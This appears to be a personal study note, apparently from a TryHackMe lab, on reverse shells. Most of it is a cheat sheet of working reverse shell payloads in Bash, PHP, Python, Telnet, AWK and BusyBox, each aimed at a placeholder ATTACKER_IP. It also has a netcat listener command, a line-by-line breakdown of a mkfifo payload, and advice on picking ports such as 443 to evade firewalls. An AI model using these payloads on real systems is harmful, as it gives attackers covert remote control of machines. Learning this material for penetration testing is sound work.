# 🔄 Reverse Shell

## Concept
The **target** connects **out** to the **attacker**. Bypasses firewalls because the connection is *outbound* from the victim.

```
Target (victim) ──outbound connection──► Attacker (nc -lvnp 443)
                                                  ↓
                                        Attacker gets shell
```

---

## How It Works — 3 Steps

**Step 1 — Attacker sets up listener**
```bash
nc -lvnp 443
```
| Flag | Meaning |
|---|---|
| `-l` | Listen for incoming connection |
| `-v` | Verbose output |
| `-n` | No DNS resolution (IP only) |
| `-p` | Port to listen on |

**Step 2 — Execute payload on target (via exploit/vulnerability)**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Step 3 — Shell received on attacker machine**
```
target@tryhackme:~$   ← You now have shell access
```

---

## Pipe Payload Breakdown
```bash
rm -f /tmp/f        # Remove existing pipe (clean start)
mkfifo /tmp/f       # Create named pipe (bidirectional comms)
cat /tmp/f          # Read input from pipe
| sh -i 2>&1        # Feed into interactive shell, capture errors
| nc ATTACKER_IP PORT  # Send shell output to attacker
>/tmp/f             # Loop output back into pipe
```

---

## 🔌 Port Selection — Blend In

| Port | Mimics |
|---|---|
| **443** | HTTPS ✅ Most stealthy |
| 80 | HTTP |
| 53 | DNS |
| 8080 | Web proxy |
| 445 | SMB |

---

## 📦 Payload Cheatsheet

### Bash
```bash
# Normal
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# FD 5
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

# Read Line
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

# FD 196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
> 💡 All Bash payloads use `/dev/tcp/IP/PORT` — Linux treats this as a network socket. FD number (5, 196) is just an unused handle label.

### PHP
```php
# exec
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

# shell_exec (returns full output as string)
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

# system (prints output directly)
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

# passthru (raw/binary output)
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'

# popen (pipe-based)
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
> 💡 Socket is always FD 3 — `fsockopen` uses next FD after stdin(0), stdout(1), stderr(2).

### Python
```python
# Short (compact)
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# Subprocess
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'

# Env Variables (cleanest)
export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
> 💡 `os.dup2(s.fileno(), 0)` = make socket behave as stdin. Doing for 0,1,2 hijacks all terminal I/O.

### Other / Fallback Tools
```bash
# Telnet (mkfifo bridge)
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF

# AWK (built-in /inet/tcp)
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# BusyBox (IoT/embedded systems)
busybox nc ATTACKER_IP 443 -e sh
```
| Tool | When to Use |
|---|---|
| Telnet | Bash unavailable, Telnet present |
| AWK | nc/bash missing but awk available |
| BusyBox | IoT/embedded systems |

---

## 🔗 More Payloads
[pentestmonkey.net reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
